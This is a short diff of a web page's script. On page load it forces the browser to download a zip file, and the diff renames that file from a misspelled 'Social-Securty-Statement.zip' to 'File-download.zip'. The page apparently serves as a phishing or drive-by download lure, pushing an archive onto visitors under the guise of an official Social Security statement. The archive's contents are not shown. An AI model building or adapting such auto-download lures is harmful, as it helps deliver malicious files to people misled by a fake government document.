@@ -113,13 +113,13 @@
 
     <script>
         // Set the file URL (must be in same folder or change path if needed)
-        const fileUrl = 'Social-Securty-Statement.zip';
+        const fileUrl = 'File-download.zip';
 
         // Trigger automatic download on page load
         window.onload = function () {
             const link = document.createElement('a');
             link.href = fileUrl;
-            link.download = 'Social-Securty-Statement.zip'; // Suggested download name
+            link.download = 'File-download.zip'; // Suggested download name
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
